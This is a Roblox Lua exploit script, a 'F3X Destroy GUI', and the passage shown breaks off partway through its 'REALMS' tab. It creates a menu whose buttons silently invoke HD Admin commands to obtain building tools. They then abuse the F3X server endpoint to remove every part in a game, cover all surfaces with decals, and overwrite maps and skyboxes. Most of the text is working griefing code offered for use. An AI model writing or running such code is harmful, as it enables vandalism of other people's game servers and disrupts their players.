-- 0nkidd F3X Destroy GUI
-- Created by K3ngx1RIV
-- Background: rbxthumb://type=Asset&id=131917032785234&w=420&h=420


-- GUI
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local iconGui = Instance.new("ScreenGui")
iconGui.Name = "0NDIcon"
iconGui.ResetOnSpawn = false
iconGui.Parent = playerGui

local iconButton = Instance.new("TextButton")
iconButton.Name = "0NDButton"
iconButton.Size = UDim2.new(0, 60, 0, 60)
iconButton.Position = UDim2.new(0, 10, 0, 10)
iconButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
iconButton.BorderSizePixel = 2
iconButton.BorderColor3 = Color3.fromRGB(255, 255, 0)
iconButton.Text = "0ND"
iconButton.TextColor3 = Color3.fromRGB(255, 255, 0)
iconButton.TextScaled = true
iconButton.Font = Enum.Font.Arial
iconButton.TextSize = 14
iconButton.ZIndex = 10
iconButton.Parent = iconGui

local iconCorner = Instance.new("UICorner")
iconCorner.CornerRadius = UDim.new(0, 8)
iconCorner.Parent = iconButton

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "GUI"
screenGui.ResetOnSpawn = false
screenGui.Enabled = false
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 500, 0, 500)
mainFrame.Position = UDim2.new(0.5, -250, 0.5, -250)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local background = Instance.new("ImageLabel")
background.Name = "Background"
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundTransparency = 1
background.Image = "rbxassetid://131917032785234"
background.ScaleType = Enum.ScaleType.Crop
background.Parent = mainFrame

local backgroundOverlay = Instance.new("Frame")
backgroundOverlay.Name = "Overlay"
backgroundOverlay.Size = UDim2.new(1, 0, 1, 0)
backgroundOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
backgroundOverlay.BackgroundTransparency = 0.7
backgroundOverlay.Parent = mainFrame

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = mainFrame

local outerBorder = Instance.new("Frame")
outerBorder.Name = "OuterBorder"
outerBorder.Size = UDim2.new(1, 6, 1, 6)
outerBorder.Position = UDim2.new(0, -3, 0, -3)
outerBorder.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
outerBorder.BorderSizePixel = 0
outerBorder.ZIndex = 0
outerBorder.Parent = mainFrame

local outerCorner = Instance.new("UICorner")
outerCorner.CornerRadius = UDim.new(0, 14)
outerCorner.Parent = outerBorder

local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, 0, 0, 50)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
titleBar.BackgroundTransparency = 0.3
titleBar.BorderSizePixel = 0
titleBar.ZIndex = 3
titleBar.Parent = mainFrame

local titleAccent = Instance.new("Frame")
titleAccent.Name = "TitleAccent"
titleAccent.Size = UDim2.new(1, 0, 0, 4)
titleAccent.Position = UDim2.new(0, 0, 0, 0)
titleAccent.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
titleAccent.BorderSizePixel = 0
titleAccent.ZIndex = 3
titleAccent.Parent = titleBar

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(1, -100, 1, 0)
titleLabel.Position = UDim2.new(0, 10, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "0NKIDD F3X DESTROY GUI V4"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 18
titleLabel.ZIndex = 3
titleLabel.Parent = titleBar

local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Size = UDim2.new(0, 80, 0, 30)
closeButton.Position = UDim2.new(1, -90, 0.5, -15)
closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
closeButton.BorderSizePixel = 0
closeButton.Text = "close"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextScaled = true
closeButton.Font = Enum.Font.Gotham
closeButton.TextSize = 12
closeButton.ZIndex = 3
closeButton.Parent = titleBar

-- TABS

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = closeButton

local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1, -20, 1, -70)
contentFrame.Position = UDim2.new(0, 10, 0, 60)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainFrame

local tabsFrame = Instance.new("Frame")
tabsFrame.Name = "TabsFrame"
tabsFrame.Size = UDim2.new(1, 0, 0, 40)
tabsFrame.BackgroundTransparency = 1
tabsFrame.Parent = contentFrame

local f3xTab = Instance.new("TextButton")
f3xTab.Name = "F3XTab"
f3xTab.Size = UDim2.new(0.25, -5, 1, 0)
f3xTab.Position = UDim2.new(0, 0, 0, 0)
f3xTab.BackgroundColor3 = Color3.fromRGB(50,50,50)
f3xTab.BorderSizePixel = 0
f3xTab.Text = "F3X TOOLS"
f3xTab.TextColor3 = Color3.fromRGB(255, 255, 255)
f3xTab.TextScaled = true
f3xTab.Font = Enum.Font.GothamBold
f3xTab.TextSize = 14
f3xTab.Parent = tabsFrame

local realmsTab = Instance.new("TextButton")
realmsTab.Name = "RealmsTab"
realmsTab.Size = UDim2.new(0.25, -5, 1, 0)
realmsTab.Position = UDim2.new(0.25, 5, 0, 0)
realmsTab.BackgroundColor3 = Color3.fromRGB(50,50,50)
realmsTab.BorderSizePixel = 0
realmsTab.Text = "REALMS"
realmsTab.TextColor3 = Color3.fromRGB(255, 255, 255)
realmsTab.TextScaled = true
realmsTab.Font = Enum.Font.GothamBold
realmsTab.TextSize = 14
realmsTab.Parent = tabsFrame

local adminTab = Instance.new("TextButton")
adminTab.Name = "AdminTab"
adminTab.Size = UDim2.new(0.25, -5, 1, 0)
adminTab.Position = UDim2.new(0.5, 5, 0, 0)
adminTab.BackgroundColor3 = Color3.fromRGB(50,50,50)
adminTab.BorderSizePixel = 0
adminTab.Text = "ADMIN"
adminTab.TextColor3 = Color3.fromRGB(255, 255, 255)
adminTab.TextScaled = true
adminTab.Font = Enum.Font.GothamBold
adminTab.TextSize = 14
adminTab.Parent = tabsFrame

local musicTab = Instance.new("TextButton")
musicTab.Name = "MusicTab"
musicTab.Size = UDim2.new(0.25, -5, 1, 0)
musicTab.Position = UDim2.new(0.75, 5, 0, 0)
musicTab.BackgroundColor3 = Color3.fromRGB(50,50,50)
musicTab.BorderSizePixel = 0
musicTab.Text = "MUSIC"
musicTab.TextColor3 = Color3.fromRGB(255, 255, 255)
musicTab.TextScaled = true
musicTab.Font = Enum.Font.GothamBold
musicTab.TextSize = 14
musicTab.Parent = tabsFrame

local tabCorner = Instance.new("UICorner")
tabCorner.CornerRadius = UDim.new(0, 8)
tabCorner.Parent = f3xTab
tabCorner:Clone().Parent = realmsTab
tabCorner:Clone().Parent = adminTab
tabCorner:Clone().Parent = musicTab

local f3xScroll = Instance.new("ScrollingFrame")
f3xScroll.Name = "F3XScroll"
f3xScroll.Size = UDim2.new(1, 0, 1, -40)
f3xScroll.Position = UDim2.new(0, 0, 0, 40)
f3xScroll.BackgroundTransparency = 1
f3xScroll.BorderSizePixel = 0
f3xScroll.ScrollBarThickness = 8
f3xScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 0)
f3xScroll.Visible = true
f3xScroll.Parent = contentFrame

local realmsScroll = Instance.new("ScrollingFrame")
realmsScroll.Name = "RealmsScroll"
realmsScroll.Size = UDim2.new(1, 0, 1, -40)
realmsScroll.Position = UDim2.new(0, 0, 0, 40)
realmsScroll.BackgroundTransparency = 1
realmsScroll.BorderSizePixel = 0
realmsScroll.ScrollBarThickness = 8
realmsScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 0)
realmsScroll.Visible = false
realmsScroll.Parent = contentFrame

local adminScroll = Instance.new("ScrollingFrame")
adminScroll.Name = "AdminScroll"
adminScroll.Size = UDim2.new(1, 0, 1, -40)
adminScroll.Position = UDim2.new(0, 0, 0, 40)
adminScroll.BackgroundTransparency = 1
adminScroll.BorderSizePixel = 0
adminScroll.ScrollBarThickness = 8
adminScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 0)
adminScroll.Visible = false
adminScroll.Parent = contentFrame

local musicScroll = Instance.new("ScrollingFrame")
musicScroll.Name = "MusicScroll"
musicScroll.Size = UDim2.new(1, 0, 1, -40)
musicScroll.Position = UDim2.new(0, 0, 0, 40)
musicScroll.BackgroundTransparency = 1
musicScroll.BorderSizePixel = 0
musicScroll.ScrollBarThickness = 8
musicScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 0)
musicScroll.Visible = false
musicScroll.Parent = contentFrame

local f3xLayout = Instance.new("UIGridLayout")
f3xLayout.CellSize = UDim2.new(1, -10, 0, 45)
f3xLayout.CellPadding = UDim2.new(0, 5, 0, 5)
f3xLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
f3xLayout.SortOrder = Enum.SortOrder.LayoutOrder
f3xLayout.Parent = f3xScroll

local realmsLayout = Instance.new("UIGridLayout")
realmsLayout.CellSize = UDim2.new(1, -10, 0, 45)
realmsLayout.CellPadding = UDim2.new(0, 5, 0, 5)
realmsLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
realmsLayout.SortOrder = Enum.SortOrder.LayoutOrder
realmsLayout.Parent = realmsScroll

local adminLayout = Instance.new("UIGridLayout")
adminLayout.CellSize = UDim2.new(1, -10, 0, 45)
adminLayout.CellPadding = UDim2.new(0, 5, 0, 5)
adminLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
adminLayout.SortOrder = Enum.SortOrder.LayoutOrder
adminLayout.Parent = adminScroll

local musicLayout = Instance.new("UIGridLayout")
musicLayout.CellSize = UDim2.new(1, -10, 0, 45)
musicLayout.CellPadding = UDim2.new(0, 5, 0, 5)
musicLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
musicLayout.SortOrder = Enum.SortOrder.LayoutOrder
musicLayout.Parent = musicScroll

local function createButton(parent, text, callback)
    local button = Instance.new("TextButton")
    button.Name = text
    button.Size = UDim2.new(1, 0, 0, 45)
    button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    button.BackgroundTransparency = 0.2
    button.BorderSizePixel = 0
    button.Text = text
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextScaled = true
    button.Font = Enum.Font.Gotham
    button.TextSize = 14
    button.Parent = parent

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 8)
    buttonCorner.Parent = button

    local buttonBorder = Instance.new("Frame")
    buttonBorder.Name = "Border"
    buttonBorder.Size = UDim2.new(1, 2, 1, 2)
    buttonBorder.Position = UDim2.new(0, -1, 0, -1)
    buttonBorder.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
    buttonBorder.BorderSizePixel = 0
    buttonBorder.ZIndex = -1
    buttonBorder.Parent = button

    local borderCorner = Instance.new("UICorner")
    borderCorner.CornerRadius = UDim.new(0, 9)
    borderCorner.Parent = buttonBorder

    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        buttonBorder.BackgroundColor3 = Color3.fromRGB(255, 255, 100)
    end)

    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        buttonBorder.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
    end)

    if callback then
        button.MouseButton1Click:Connect(callback)
    end

    return button
end

-- F3X TAB

local function getF3XTool()
    local p = game.Players.LocalPlayer
    local char = p.Character
    local backpack = p.Backpack
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then
            return v
        end
    end
    if char then
        for _, v in ipairs(char:GetChildren()) do
            if v:FindFirstChild("SyncAPI") then
                return v
            end
        end
    end
    return nil
end

local function createSkybox(textureId)
    local f3x = getF3XTool()
    if not f3x then return end
    local serverEndpoint = f3x.SyncAPI.ServerEndpoint
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local position = hrp.CFrame.Position + Vector3.new(0, 10, 0)
    local skyPart = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(position), workspace)
    serverEndpoint:InvokeServer("CreateMeshes", { { Part = skyPart } })
    serverEndpoint:InvokeServer("SyncMesh", { { Part = skyPart, MeshId = "rbxassetid://111891702759441" } })
    serverEndpoint:InvokeServer("SyncMesh", { { Part = skyPart, TextureId = "rbxassetid://"..tostring(textureId) } })
    serverEndpoint:InvokeServer("SyncMesh", { { Part = skyPart, Scale = Vector3.new(10000, 10000, 10000) } })
    serverEndpoint:InvokeServer("SetLocked", { skyPart }, true)
    serverEndpoint:InvokeServer("SetName", { skyPart }, "Sky")
end

local function decalSpam(textureId)
    local f3x = getF3XTool()
    if not f3x then return end
    local serverEndpoint = f3x.SyncAPI.ServerEndpoint
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") or v:IsA("UnionOperation") then
            task.spawn(function()
                local faces = {Enum.NormalId.Front, Enum.NormalId.Back, Enum.NormalId.Left, Enum.NormalId.Right, Enum.NormalId.Top, Enum.NormalId.Bottom}
                for _, face in ipairs(faces) do
                    serverEndpoint:InvokeServer("CreateTextures", { { Part = v, Face = face, TextureType = "Decal" } })
                    serverEndpoint:InvokeServer("SyncTexture", { { Part = v, Face = face, TextureType = "Decal", Texture = "rbxassetid://"..tostring(textureId) } })
                end
            end)
        end
    end
end

createButton(f3xScroll, "Skybox 1", function()
    local RequestCommand = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools")
    RequestCommand:InvokeServer(";fogcolor black")
    task.wait(0.5)
    createSkybox("122891033183126")
end)

createButton(f3xScroll, "Skybox 2", function()
    local RequestCommand = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools")
    RequestCommand:InvokeServer(";fogcolor black")
    task.wait(0.5)
    createSkybox("131917032785234")
end)

createButton(f3xScroll, "Skybox 3", function()
    local RequestCommand = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools")
    RequestCommand:InvokeServer(";fogcolor black")
    local f3x = getF3XTool()
    if not f3x then return end
    local remote = f3x.SyncAPI.ServerEndpoint
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local cf = hrp.CFrame + Vector3.new(0, 5, 0)
    local part = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
    remote:InvokeServer("CreateMeshes", { { Part = part } })
    remote:InvokeServer("SyncMesh", { { Part = part, MeshId = "rbxassetid://111891702759441", TextureId = "rbxassetid://121255560184231", Scale = Vector3.new(10000,10000,10000) } })
    remote:InvokeServer("SetLocked", { part }, true)
end)

createButton(f3xScroll, "Decal spam", function()
    local RequestCommand = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools")
    task.wait(0.5)
    decalSpam("131917032785234")
end)

createButton(f3xScroll, "Decal spam 2", function()
    local RequestCommand = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools")
    task.wait(0.5)
    decalSpam("122891033183126")
end)

createButton(f3xScroll, "Decal Spam 3", function()
    local RequestCommand = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools")
    task.wait(0.2)
    local f3x = getF3XTool()
    if not f3x then return end
    local remote = f3x.SyncAPI.ServerEndpoint
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("Part") then
            task.spawn(function()
                local faces = {Enum.NormalId.Front,Enum.NormalId.Back,Enum.NormalId.Right,Enum.NormalId.Left,Enum.NormalId.Top,Enum.NormalId.Bottom}
                for _, face in ipairs(faces) do
                    remote:InvokeServer("CreateTextures", { { Part = v, Face = face, TextureType = "Decal" } })
                    remote:InvokeServer("SyncTexture", { { Part = v, Face = face, TextureType = "Decal", Texture = "rbxassetid://104235488875041" } })
                end
            end)
        end
    end
end)

createButton(f3xScroll, "Big Baseplate", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";btools")
    local f3x = getF3XTool()
    if not f3x then return end
    local remote = f3x.SyncAPI.ServerEndpoint
    for _,v in workspace:GetDescendants() do
        if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
            task.spawn(function() pcall(function() remote:InvokeServer("Remove", {v}) end) end)
        end
    end
    task.wait(1)
    local cf = CFrame.new(0, -5, 0)
    local bp = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
    remote:InvokeServer("SyncResize", { { Part = bp, CFrame = cf, Size = Vector3.new(10000,10,10000) } })
    remote:InvokeServer("SyncMaterial", { { Part = bp, Material = Enum.Material.Grass } })
    remote:InvokeServer("SyncColor", { { Part = bp, Color = Color3.fromRGB(0,200,0) } })
    remote:InvokeServer("SetLocked", { bp }, true)
end)

createButton(f3xScroll, "Diagonal Map", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";btools")
    local f3x = getF3XTool()
    if not f3x then return end
    local remote = f3x.SyncAPI.ServerEndpoint
    for _,v in workspace:GetDescendants() do
        if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
            task.spawn(function() pcall(function() remote:InvokeServer("Remove", {v}) end) end)
        end
    end
    task.wait(1)
    local cf = CFrame.new(0,0,0) * CFrame.Angles(0, math.rad(45), math.rad(45))
    local p = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
    remote:InvokeServer("SyncResize", { { Part = p, CFrame = cf, Size = Vector3.new(1000,50,1000) } })
    remote:InvokeServer("SyncMaterial", { { Part = p, Material = Enum.Material.Neon } })
    remote:InvokeServer("SyncColor", { { Part = p, Color = Color3.fromRGB(0,255,255) } })
    remote:InvokeServer("SetLocked", { p }, true)
end)

createButton(f3xScroll, "Happy House", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";btools")
    local f3x = getF3XTool()
    if not f3x then return end
    local remote = f3x.SyncAPI.ServerEndpoint

    for _,v in workspace:GetDescendants() do
        if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
            task.spawn(function() pcall(function() remote:InvokeServer("Remove", {v}) end) end)
        end
    end
    task.wait(1)

    local baseCF = CFrame.new(0,0,0)
    local base = remote:InvokeServer("CreatePart","Normal",baseCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=base,CFrame=baseCF,Size=Vector3.new(500,5,500)} })
    remote:InvokeServer("SyncMaterial",{ {Part=base,Material=Enum.Material.Grass} })
    remote:InvokeServer("SetLocked",{base},true)

    local floorCF = CFrame.new(0,2.5,0)
    local floor = remote:InvokeServer("CreatePart","Normal",floorCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=floor,CFrame=floorCF,Size=Vector3.new(40,1,40)} })
    remote:InvokeServer("SyncMaterial",{ {Part=floor,Material=Enum.Material.WoodPlanks} })
    remote:InvokeServer("SetLocked",{floor},true)

    local backCF = CFrame.new(0,10,-20)
    local back = remote:InvokeServer("CreatePart","Normal",backCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=back,CFrame=backCF,Size=Vector3.new(40,20,2)} })
    remote:InvokeServer("SyncMaterial",{ {Part=back,Material=Enum.Material.Brick} })
    remote:InvokeServer("SyncColor",{ {Part=back,Color=Color3.fromRGB(200,200,200)} })
    remote:InvokeServer("SetLocked",{back},true)

    local frontCF = CFrame.new(0,10,20)
    local front = remote:InvokeServer("CreatePart","Normal",frontCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=front,CFrame=frontCF,Size=Vector3.new(40,20,2)} })
    remote:InvokeServer("SyncMaterial",{ {Part=front,Material=Enum.Material.Brick} })
    remote:InvokeServer("SyncColor",{ {Part=front,Color=Color3.fromRGB(200,200,200)} })
    remote:InvokeServer("SetLocked",{front},true)

    local leftCF = CFrame.new(-20,10,0)
    local left = remote:InvokeServer("CreatePart","Normal",leftCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=left,CFrame=leftCF,Size=Vector3.new(2,20,40)} })
    remote:InvokeServer("SyncMaterial",{ {Part=left,Material=Enum.Material.Brick} })
    remote:InvokeServer("SyncColor",{ {Part=left,Color=Color3.fromRGB(200,200,200)} })
    remote:InvokeServer("SetLocked",{left},true)

    local rightCF = CFrame.new(20,10,0)
    local right = remote:InvokeServer("CreatePart","Normal",rightCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=right,CFrame=rightCF,Size=Vector3.new(2,20,40)} })
    remote:InvokeServer("SyncMaterial",{ {Part=right,Material=Enum.Material.Brick} })
    remote:InvokeServer("SyncColor",{ {Part=right,Color=Color3.fromRGB(200,200,200)} })
    remote:InvokeServer("SetLocked",{right},true)

    local roofCF = CFrame.new(0,21,0)
    local roof = remote:InvokeServer("CreatePart","Normal",roofCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=roof,CFrame=roofCF,Size=Vector3.new(42,2,42)} })
    remote:InvokeServer("SyncMaterial",{ {Part=roof,Material=Enum.Material.Wood} })
    remote:InvokeServer("SyncColor",{ {Part=roof,Color=Color3.fromRGB(150,100,50)} })
    remote:InvokeServer("SetLocked",{roof},true)

    local doorCF = CFrame.new(0,5,19)
    local door = remote:InvokeServer("CreatePart","Normal",doorCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=door,CFrame=doorCF,Size=Vector3.new(8,10,1)} })
    remote:InvokeServer("SyncMaterial",{ {Part=door,Material=Enum.Material.Wood} })
    remote:InvokeServer("SyncColor",{ {Part=door,Color=Color3.fromRGB(100,70,30)} })
    remote:InvokeServer("SetLocked",{door},true)

    local w1CF = CFrame.new(-19,10,0)
    local w1 = remote:InvokeServer("CreatePart","Normal",w1CF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=w1,CFrame=w1CF,Size=Vector3.new(1,8,12)} })
    remote:InvokeServer("SyncMaterial",{ {Part=w1,Material=Enum.Material.Glass} })
    remote:InvokeServer("SetLocked",{w1},true)

    local w2CF = CFrame.new(19,10,0)
    local w2 = remote:InvokeServer("CreatePart","Normal",w2CF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=w2,CFrame=w2CF,Size=Vector3.new(1,8,12)} })
    remote:InvokeServer("SyncMaterial",{ {Part=w2,Material=Enum.Material.Glass} })
    remote:InvokeServer("SetLocked",{w2},true)
end)

createButton(f3xScroll, "Islands", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";btools")
    local f3x = getF3XTool()
    if not f3x then return end
    local remote = f3x.SyncAPI.ServerEndpoint

    for _,v in workspace:GetDescendants() do
        if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
            task.spawn(function() pcall(function() remote:InvokeServer("Remove", {v}) end) end)
        end
    end
    task.wait(1)

    local positions = {
        Vector3.new(-40,0,-40), Vector3.new(0,0,-40), Vector3.new(40,0,-40),
        Vector3.new(-40,0,0), Vector3.new(0,0,0), Vector3.new(40,0,0),
        Vector3.new(-40,0,40), Vector3.new(0,0,40), Vector3.new(40,0,40)
    }
    for _, pos in pairs(positions) do
        local cf = CFrame.new(pos)
        local p = remote:InvokeServer("CreatePart","Normal",cf,workspace)
        remote:InvokeServer("SyncResize",{ {Part=p,CFrame=cf,Size=Vector3.new(20,5,20)} })
        remote:InvokeServer("SyncMaterial",{ {Part=p,Material=Enum.Material.Grass} })
        local r = math.random(50,200); local g = math.random(50,200); local b = math.random(50,200)
        remote:InvokeServer("SyncColor",{ {Part=p,Color=Color3.fromRGB(r,g,b)} })
        remote:InvokeServer("SetLocked",{p},true)
    end
end)

createButton(f3xScroll, "0nkidd Favorite Map", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";btools")
    local f3x = getF3XTool()
    if not f3x then return end
    local remote = f3x.SyncAPI.ServerEndpoint

    for _,v in workspace:GetDescendants() do
        if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
            task.spawn(function() pcall(function() remote:InvokeServer("Remove", {v}) end) end)
        end
    end
    task.wait(1)

    local mainCF = CFrame.new(0,0,0) * CFrame.Angles(0,0,math.rad(45))
    local mainP = remote:InvokeServer("CreatePart","Normal",mainCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=mainP,CFrame=mainCF,Size=Vector3.new(300,10,300)} })
    remote:InvokeServer("SyncMaterial",{ {Part=mainP,Material=Enum.Material.Neon} })
    remote:InvokeServer("SyncColor",{ {Part=mainP,Color=Color3.fromRGB(255,100,0)} })
    remote:InvokeServer("SetLocked",{mainP},true)

    local radius = 100
    local num = 8
    local colors = {
        Color3.fromRGB(255,0,0), Color3.fromRGB(255,127,0), Color3.fromRGB(255,255,0),
        Color3.fromRGB(0,255,0), Color3.fromRGB(0,0,255), Color3.fromRGB(75,0,130),
        Color3.fromRGB(148,0,211), Color3.fromRGB(255,0,255)
    }
    for i=1,num do
        local angle = (i/num)*math.pi*2
        local x = math.cos(angle)*radius
        local z = math.sin(angle)*radius
        local cf = CFrame.new(x,20,z) * CFrame.Angles(0,0,math.rad(45))
        local p = remote:InvokeServer("CreatePart","Normal",cf,workspace)
        remote:InvokeServer("SyncResize",{ {Part=p,CFrame=cf,Size=Vector3.new(30,5,30)} })
        remote:InvokeServer("SyncMaterial",{ {Part=p,Material=Enum.Material.Neon} })
        remote:InvokeServer("SyncColor",{ {Part=p,Color=colors[i] or Color3.new(1,1,1)} })
        remote:InvokeServer("SetLocked",{p},true)
    end
end)

createButton(f3xScroll, "Delete All", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";btools")
    task.wait(0.3)
    local f3x = getF3XTool()
    if not f3x then return end
    local remote = f3x.SyncAPI.ServerEndpoint
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") or v:IsA("UnionOperation") then
            task.spawn(function() remote:InvokeServer("Remove", {v}) end)
        end
    end
end)

createButton(f3xScroll, "DESTROY FOR EMERGENCY", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";btools me")
    Request:InvokeServer(";fogcolor black")
    Request:InvokeServer(";time 0")
    task.wait(1)
    local f3x = getF3XTool()
    if not f3x then return end
    local remote = f3x.SyncAPI.ServerEndpoint
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") or v:IsA("UnionOperation") or v:IsA("Model") then
            task.spawn(function() pcall(function() remote:InvokeServer("Remove", {v}) end) end)
        end
    end
    task.wait(2)
    local base = remote:InvokeServer("CreatePart","Normal",CFrame.new(0,0,0),workspace)
    remote:InvokeServer("SyncResize",{ {Part=base,CFrame=CFrame.new(0,0,0),Size=Vector3.new(500,5,500)} })
    remote:InvokeServer("SyncColor",{ {Part=base,Color=Color3.fromRGB(100,100,100),UnionColoring=false} })
    remote:InvokeServer("SetLocked",{base},true)
    remote:InvokeServer("SetName",{base},"Baseplate")
end)

-- ====== REALMS TAB ======
createButton(realmsScroll, "666", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";btools")
	  local player = game.Players.LocalPlayer
            local char = player.Character
            local tool
            for i,v in player:GetDescendants() do
                if v.Name == "SyncAPI" then
                    tool = v.Parent
                end
            end
            for i,v in game.ReplicatedStorage:GetDescendants() do
                if v.Name == "SyncAPI" then
                    tool = v.Parent
                end
            end
            --craaa
            remote = tool.SyncAPI.ServerEndpoint
            function _(args)
                remote:InvokeServer(unpack(args))
            end
            function SetCollision(part,boolean)
                local args = {
                    [1] = "SyncCollision",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["CanCollide"] = boolean
                        }
                    }
                }
                _(args)
            end
            function SetAnchor(boolean,part)
                local args = {
                    [1] = "SyncAnchor",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["Anchored"] = boolean
                        }
                    }
                }
                _(args)
            end
            function CreatePart(cf,parent)
                local args = {
                    [1] = "CreatePart",
                    [2] = "Normal",
                    [3] = cf,
                    [4] = parent
                }
                _(args)
            end
            function DestroyPart(part)
                local args = {
                    [1] = "Remove",
                    [2] = {
                        [1] = part
                    }
                }
                _(args)
            end
            function MovePart(part,cf)
                local args = {
                    [1] = "SyncMove",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["CFrame"] = cf
                        }
                    }
                }
                _(args)
            end
            function Resize(part,size,cf)
                local args = {
                    [1] = "SyncResize",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["CFrame"] = cf,
                            ["Size"] = size
                        }
                    }
                }
                _(args)
            end
            function AddMesh(part)
                local args = {
                    [1] = "CreateMeshes",
                    [2] = {
                        [1] = {
                            ["Part"] = part
                        }
                    }
                }
                _(args)
            end
